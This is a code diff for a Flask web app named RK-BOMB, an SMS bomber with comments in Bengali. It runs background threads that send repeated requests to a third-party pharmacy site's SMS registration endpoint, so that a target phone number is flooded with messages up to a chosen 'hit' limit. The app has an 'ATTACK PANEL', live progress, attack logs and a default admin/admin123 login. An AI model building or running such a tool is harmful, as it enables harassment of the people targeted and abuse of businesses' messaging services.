@@ -1,270 +1,219 @@
-import requests, threading, os, time, random, json, sqlite3
+import requests
+import threading
+import os
+import time
+import sqlite3
+import random
 from datetime import datetime
-from flask import Flask, render_template_string, request, jsonify
+from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
+from werkzeug.security import generate_password_hash, check_password_hash
 
 app = Flask(__name__)
+app.secret_key = os.urandom(24)
 
-# 🚩 আপনার দেওয়া গিটহাবের RAW JSON লিঙ্ক
-GITHUB_API_URL = "https://raw.githubusercontent.com/RK-SYSTEM1/RK-BOMB/refs/heads/main/api.json"
+# ---------- CONFIG & DB ----------
+def get_db():
+    conn = sqlite3.connect('system_rk_v3.db', check_same_thread=False)
+    conn.row_factory = sqlite3.Row
+    return conn
 
-# ---------- DATABASE SETUP ----------
 def init_db():
-    conn = sqlite3.connect('bomb_history.db')
-    conn.execute('''CREATE TABLE IF NOT EXISTS history 
-                   (id INTEGER PRIMARY KEY AUTOINCREMENT, 
-                    phone TEXT, amount INTEGER, success INTEGER, 
-                    date TEXT)''')
-    conn.commit()
-    conn.close()
+    with get_db() as conn:
+        conn.execute('''CREATE TABLE IF NOT EXISTS history (
+            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
+            success INTEGER, total INTEGER, limit_amt INTEGER, status TEXT, 
+            start_time TEXT, stop_time TEXT, duration TEXT, date_str TEXT)''')
+        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
+        try:
+            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("admin123"), "active"))
+        except: pass
 
 init_db()
 
-def fetch_remote_apis():
-    try:
-        # গিটহাব থেকে সরাসরি এপিআই লিস্ট নিয়ে আসা
-        r = requests.get(GITHUB_API_URL, timeout=10)
-        if r.status_code == 200:
-            return r.json()
-        return []
-    except Exception as e:
-        print(f"Error fetching APIs: {e}")
-        return []
+# ---------- BOMBING CORE ----------
+active_sessions = {}
 
-# ---------- UI DESIGN (সেই আগের পপুলার ডিজাইন) ----------
-HTML_LAYOUT = '''
+def bombing_task(username, phone, limit, start_dt):
+    key = f"{username}_{phone}"
+    
+    # আপনার API লিস্ট এখানে বসান (একাধিক দিলে রেন্ডমলি কাজ করবে)
+    api_list = [
+        "https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}"
+        # "https://example.com/api2?number={}",
+    ]
+
+    while key in active_sessions:
+        curr = active_sessions[key]
+        if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped':
+            break
+            
+        if curr['status'] == 'Running':
+            try:
+                target_api = random.choice(api_list).format(phone)
+                res = requests.get(target_api, timeout=10)
+                if res.status_code == 200:
+                    active_sessions[key]['success'] += 1
+                    active_sessions[key]['new_hit'] = True
+            except: pass
+            
+            active_sessions[key]['total'] += 1
+            time.sleep(1.2) # API রেট লিমিট এড়াতে
+        else:
+            time.sleep(1)
+
+    # Finalizing Data
+    stop_dt = datetime.now()
+    duration = str(stop_dt - start_dt).split('.')[0]
+    s = active_sessions.get(key)
+    if s:
+        with get_db() as conn:
+            conn.execute("INSERT INTO history (username, phone, success, total, limit_amt, status, start_time, stop_time, duration, date_str) VALUES (?,?,?,?,?,?,?,?,?,?)",
+                (username, phone, s['success'], s['total'], s['limit'], "Finished", s['start_time'], stop_dt.strftime("%I:%M %p"), duration, start_dt.strftime("%d/%m/%Y")))
+        del active_sessions[key]
+
+# ---------- ADVANCED UI ----------
+LAYOUT = '''
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>⚡ RK SMS Sender PRO</title>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700;900&display=swap" rel="stylesheet">
-<style>
-    *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
-    body{min-height:100vh; background: linear-gradient(135deg,#0f2027,#203a43,#2c5364); padding:20px; color:#fff;}
-    .container{max-width:450px; margin:auto;}
-    
-    .card{background:rgba(255,255,255,0.12); backdrop-filter:blur(20px); border-radius:25px; padding:25px; box-shadow:0 8px 32px rgba(0,255,255,0.2); border:1px solid rgba(255,255,255,0.1); margin-bottom:20px;}
-    h2{text-align:center; font-weight:900; text-shadow:0 0 15px #00f2fe; margin-bottom:5px;}
-    .made-by{text-align:center; color:#4facfe; font-size:12px; font-weight:700; margin-bottom:20px; text-transform:uppercase;}
-    
-    input{width:100%; padding:14px; border-radius:12px; border:none; background:rgba(255,255,255,0.1); color:#fff; margin-bottom:15px; border:1px solid rgba(0,242,254,0.3); outline:none;}
-    input:focus{border-color:#00f2fe; background:rgba(255,255,255,0.15);}
-
-    .selection-row{display:flex; justify-content:space-between; margin-bottom:10px; font-size:13px; font-weight:bold;}
-    .api-list-box{max-height: 200px; overflow-y: auto; background: rgba(0,0,0,0.3); border-radius: 15px; padding: 10px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1);}
-    .api-item{display: flex; justify-content: space-between; align-items: center; padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px;}
-    .api-item label{cursor:pointer; flex-grow:1;}
-    .api-item input[type="checkbox"]{margin-right:10px; accent-color:#00f2fe;}
-
-    .btn-main{width:100%; padding:18px; border-radius:18px; background:linear-gradient(135deg,#00f2fe,#4facfe); border:none; color:#000; font-weight:900; cursor:pointer; text-transform:uppercase; transition:0.3s; box-shadow:0 5px 15px rgba(0,242,254,0.3);}
-    .btn-main:disabled{opacity:0.5; transform:scale(0.98);}
-
-    #report{display:none; text-align:center; margin-top:20px; padding:15px; background:rgba(0,0,0,0.2); border-radius:12px;}
-    
-    /* History Section */
-    .history-card{background:rgba(0,0,0,0.4); border-radius:20px; padding:20px; border:1px solid #333; margin-top:10px;}
-    .history-card h3{font-size:16px; margin-bottom:15px; color:#00f2fe; border-left:4px solid #00f2fe; padding-left:10px;}
-    .hist-table-wrap{overflow-x:auto;}
-    table{width:100%; border-collapse:collapse; font-size:11px;}
-    th, td{padding:12px 8px; text-align:left; border-bottom:1px solid #222;}
-    th{color:#4facfe; text-transform:uppercase;}
-    .success-count{color:#00ff9d; font-weight:bold;}
-    .st-icon{font-weight:bold; font-size:14px;}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RK-BOMB ULTIMATE</title>
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --neon: #00ffcc; --bg: #050505; --card: #111; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Rajdhani', sans-serif; margin: 0; padding: 0; }
+        .nav { background: #000; padding: 15px; border-bottom: 1px solid var(--neon); display: flex; justify-content: space-between; position: sticky; top:0; z-index: 100;}
+        .container { padding: 20px; max-width: 600px; margin: auto; }
+        .card { background: var(--card); border: 1px solid #222; border-radius: 15px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        .fire-btn { background: var(--neon); color: #000; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; font-family: 'Rajdhani'; font-size: 16px; }
+        .fire-btn:hover { box-shadow: 0 0 20px var(--neon); transform: translateY(-2px); }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: #fff; border-radius: 8px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(0,255,204,0.2); }
+        .prog-bg { background: #222; height: 12px; border-radius: 6px; overflow: hidden; margin: 15px 0; }
+        .prog-bar { background: linear-gradient(90deg, #00ffcc, #0099ff); height: 100%; width: 0%; transition: 0.5s; }
+        .badge { background: #1a1a1a; padding: 5px 10px; border-radius: 5px; font-size: 12px; border: 1px solid #333; }
+        a { color: var(--neon); text-decoration: none; font-weight: bold; }
+        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
+    </style>
 </head>
 <body>
-
-<div class="container">
-    <div class="card">
-        <h2>📩 RK Sender</h2>
-        <div class="made-by">⚡ RK-SYSTEM1 PREMIUM ⚡</div>
-
-        <input type="text" id="number" placeholder="📞 Phone Number (01XXXXXXXXX)">
-        <input type="number" id="amount" placeholder="🔁 Amount" value="1">
-
-        <div class="selection-row">
-            <span>SELECT APIs:</span>
-            <span onclick="toggleSelectAll()" style="color:#00f2fe; cursor:pointer;" id="selBtn">Select All</span>
-        </div>
-
-        <div class="api-list-box" id="apiList">
-            <p style="text-align:center; padding:20px; color:#888;">Fetching Cloud APIs...</p>
-        </div>
-
-        <button onclick="startAttack()" id="mainBtn" class="btn-main">🚀 Launch Attack</button>
-        
-        <div id="report">
-            ✅ Success: <span id="sCount" style="color:#00ff9d;">0</span> | 
-            ❌ Fail: <span id="fCount" style="color:#ff6b6b;">0</span>
-        </div>
+    <audio id="hitSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
+    <div class="nav">
+        <div style="font-weight: 700; font-size: 20px;">RK-BOMB <span style="color:#fff">V3</span></div>
+        <div style="font-size: 14px;"><a href="/dashboard">DASH</a> | <a href="/history">LOGS</a> | <a href="/logout" style="color: #ff4444;">EXIT</a></div>
     </div>
-
-    <div class="history-card">
-        <h3>📜 Attack History</h3>
-        <div class="hist-table-wrap" id="historyData">
-            </div>
-    </div>
-</div>
-
-<script>
-let allAPIs = [];
-let isAllSelected = false;
-
-// পেজ লোড হলে এপিআই এবং হিস্ট্রি নিয়ে আসা
-async function init() {
-    try {
-        const res = await fetch('/get_apis');
-        allAPIs = await res.json();
-        let html = '';
-        allAPIs.forEach((api, i) => {
-            html += `
-            <div class="api-item">
-                <label><input type="checkbox" class="api-check" value="\${i}"> \${api.name}</label>
-                <span id="st-\${i}" class="st-icon"></span>
-            </div>`;
-        });
-        document.getElementById('apiList').innerHTML = html;
-        loadHistory();
-    } catch (e) {
-        document.getElementById('apiList').innerHTML = "Error loading APIs.";
-    }
-}
-
-async function loadHistory() {
-    const res = await fetch('/get_history');
-    const logs = await res.json();
-    if(logs.length === 0) {
-        document.getElementById('historyData').innerHTML = "<p style='text-align:center; font-size:12px; color:#666;'>No history found.</p>";
-        return;
-    }
-    let table = '<table><tr><th>Target</th><th>Limit</th><th>Success</th><th>Time</th></tr>';
-    logs.forEach(l => {
-        table += \`<tr><td>\${l.phone}</td><td>\${l.amount}</td><td class="success-count">\${l.success}</td><td>\${l.date}</td></tr>\`;
-    });
-    document.getElementById('historyData').innerHTML = table + '</table>';
-}
-
-function toggleSelectAll() {
-    isAllSelected = !isAllSelected;
-    document.querySelectorAll('.api-check').forEach(c => c.checked = isAllSelected);
-    document.getElementById('selBtn').innerText = isAllSelected ? "Deselect All" : "Select All";
-}
-
-async function startAttack() {
-    const num = document.getElementById('number').value.trim();
-    const amt = parseInt(document.getElementById('amount').value);
-    const checkedIdx = Array.from(document.querySelectorAll('.api-check:checked')).map(c => c.value);
-
-    if(!num || isNaN(amt) || checkedIdx.length === 0) {
-        alert("নাম্বার দিন এবং অন্তত একটি এপিআই সিলেক্ট করুন!");
-        return;
-    }
-
-    const btn = document.getElementById('mainBtn');
-    btn.disabled = true;
-    btn.innerText = "BOMBING...";
-    document.getElementById('report').style.display = "block";
-
-    let s = 0, f = 0;
-    // রিফ্রেশ স্ট্যাটাস আইকন
-    checkedIdx.forEach(idx => document.getElementById(\`st-\${idx}\`).innerText = "");
-
-    for(let r=0; r<amt; r++) {
-        for(let idx of checkedIdx) {
-            const api = allAPIs[idx];
-            try {
-                const res = await fetch('/proxy_req', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({api: api, num: num})
-                });
-                if(res.ok) {
-                    s++;
-                    document.getElementById(\`st-\${idx}\`).innerHTML = "<span style='color:#00ff9d;'>✔</span>";
-                } else {
-                    f++;
-                    document.getElementById(\`st-\${idx}\`).innerHTML = "<span style='color:#ff6b6b;'>✖</span>";
+    <div class="container">[CONTENT]</div>
+    <script>
+        function playHit() { let s = document.getElementById('hitSound'); s.currentTime=0; s.play().catch(e=>{}); }
+        function sync() {
+            if(!document.getElementById('live-engine')) return;
+            fetch('/api/status').then(r=>r.json()).then(data=>{
+                let html = '';
+                for(let k in data){
+                    let s = data[k];
+                    if(s.new_hit) playHit();
+                    let p = (s.total/s.limit)*100;
+                    html += `<div class="card" style="border-left: 4px solid var(--neon)">
+                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                            <b>TARGET: ${s.phone}</b>
+                            <span class="badge">${s.status}</span>
+                        </div>
+                        <div class="prog-bg"><div class="prog-bar" style="width:${p}%"></div></div>
+                        <div class="stat-grid">
+                            <div class="badge">Success: ${s.success}</div>
+                            <div class="badge">Total: ${s.total} / ${s.limit}</div>
+                        </div>
+                        <div class="stat-grid">
+                            <button class="fire-btn" style="background:#ffaa00; font-size:12px;" onclick="location.href='/api/control?num=${s.phone}&action=${s.status=='Running'?'Paused':'Running'}'">${s.status=='Running'?'PAUSE':'RESUME'}</button>
+                            <button class="fire-btn" style="background:#ff4444; color:#fff; font-size:12px;" onclick="location.href='/api/stop?num=${s.phone}'">TERMINATE</button>
+                        </div>
+                    </div>`;
                 }
-            } catch {
-                f++;
-                document.getElementById(\`st-\${idx}\`).innerHTML = "<span style='color:#ff6b6b;'>✖</span>";
-            }
-            document.getElementById('sCount').innerText = s;
-            document.getElementById('fCount').innerText = f;
+                document.getElementById('live-engine').innerHTML = html;
+            });
         }
-    }
-
-    // হিস্ট্রি সেভ
-    await fetch('/save_history', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({phone: num, amount: amt, success: s})
-    });
-
-    btn.disabled = false;
-    btn.innerText = "🚀 Launch Attack";
-    loadHistory();
-    alert("অ্যাটাক সম্পন্ন হয়েছে!");
-}
-
-init();
-</script>
+        setInterval(sync, 2000);
+    </script>
 </body>
 </html>
 '''
 
-# ---------- BACKEND LOGIC ----------
+# ---------- ROUTES ----------
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        u, p = request.form.get('u'), request.form.get('p')
+        with get_db() as conn:
+            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
+        if user and check_password_hash(user['password'], p):
+            session['user'] = u
+            return redirect(url_for('dashboard'))
+    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="card" style="text-align:center;"><h2>SYSTEM ACCESS</h2><form method="POST"><input name="u" placeholder="Admin ID" required><input name="p" type="password" placeholder="Password" required><button class="fire-btn">INITIALIZE</button></form></div>'))
 
-@app.route('/')
-def index():
-    return render_template_string(HTML_LAYOUT)
+@app.route('/dashboard')
+def dashboard():
+    if 'user' not in session: return redirect(url_for('login'))
+    return render_template_string(LAYOUT.replace('[CONTENT]', '''
+        <div class="card">
+            <h3 style="margin-top:0">🚀 ATTACK PANEL</h3>
+            <form action="/api/start">
+                <input name="num" placeholder="Phone Number (e.g. 017...)" required>
+                <input name="amt" type="number" placeholder="Hit Amount (Max 500)" max="500" required>
+                <button class="fire-btn">LAUNCH ATTACK</button>
+            </form>
+        </div>
+        <div id="live-engine"></div>
+    '''))
 
-@app.route('/get_apis')
-def get_apis():
-    return jsonify(fetch_remote_apis())
-
-@app.route('/get_history')
-def get_history():
-    conn = sqlite3.connect('bomb_history.db')
-    cursor = conn.cursor()
-    cursor.execute("SELECT phone, amount, success, date FROM history ORDER BY id DESC LIMIT 10")
-    rows = cursor.fetchall()
-    conn.close()
-    return jsonify([{'phone': r[0], 'amount': r[1], 'success': r[2], 'date': r[3]} for r in rows])
-
-@app.route('/save_history', methods=['POST'])
-def save_history():
-    data = request.json
-    conn = sqlite3.connect('bomb_history.db')
-    conn.execute("INSERT INTO history (phone, amount, success, date) VALUES (?, ?, ?, ?)",
-                 (data['phone'], data['amount'], data['success'], datetime.now().strftime("%d %b, %I:%M %p")))
-    conn.commit()
-    conn.close()
-    return "OK"
-
-@app.route('/proxy_req', methods=['POST'])
-def proxy_req():
-    data = request.json
-    api = data['api']
-    num = data['num']
-    p_no_zero = num.lstrip('0')
-
-    url = api['url'].replace("{phone}", num).replace("{phone_no_zero}", p_no_zero)
-    method = api.get('method', 'GET')
-    headers = api.get('headers', {})
+@app.route('/history')
+def history():
+    if 'user' not in session: return redirect(url_for('login'))
+    with get_db() as conn:
+        logs = conn.execute("SELECT * FROM history ORDER BY id DESC LIMIT 15").fetchall()
     
-    try:
-        if method == "POST":
-            body = api.get('body', "").replace("{phone}", num).replace("{phone_no_zero}", p_no_zero)
-            try: body_data = json.loads(body)
-            except: body_data = body
-            r = requests.post(url, json=body_data, headers=headers, timeout=5)
-        else:
-            r = requests.get(url, headers=headers, timeout=5)
-        return "OK" if r.status_code == 200 else "FAIL", r.status_code
-    except:
-        return "ERROR", 500
+    html = '<h3>📜 RECENT LOGS</h3>'
+    for l in logs:
+        html += f'''<div class="card" style="font-size:14px; padding:15px;">
+            <div style="display:flex; justify-content:space-between;"><b>{l['phone']}</b> <span>{l['date_str']}</span></div>
+            <div style="color:#888; margin-top:5px;">Hits: {l['success']} | Duration: {l['duration']}</div>
+        </div>'''
+    return render_template_string(LAYOUT.replace('[CONTENT]', html))
+
+@app.route('/api/start')
+def api_start():
+    u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
+    if u and num and amt:
+        now = datetime.now()
+        active_sessions[f"{u}_{num}"] = {
+            'phone': num, 'success': 0, 'total': 0, 'limit': int(amt), 
+            'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'new_hit': False
+        }
+        threading.Thread(target=bombing_task, args=(u, num, int(amt), now), daemon=True).start()
+    return redirect(url_for('dashboard'))
+
+@app.route('/api/status')
+def api_status():
+    u = session.get('user', '')
+    data = {k: v for k, v in active_sessions.items() if k.startswith(u)}
+    res = jsonify(data)
+    for k in data: active_sessions[k]['new_hit'] = False
+    return res
+
+@app.route('/api/control')
+def api_control():
+    key = f"{session.get('user')}_{request.args.get('num')}"
+    if key in active_sessions: active_sessions[key]['status'] = request.args.get('action')
+    return redirect(url_for('dashboard'))
+
+@app.route('/api/stop')
+def api_stop():
+    key = f"{session.get('user')}_{request.args.get('num')}"
+    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
+    return redirect(url_for('dashboard'))
+
+@app.route('/logout')
+def logout(): session.clear(); return redirect(url_for('login'))
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=10000)
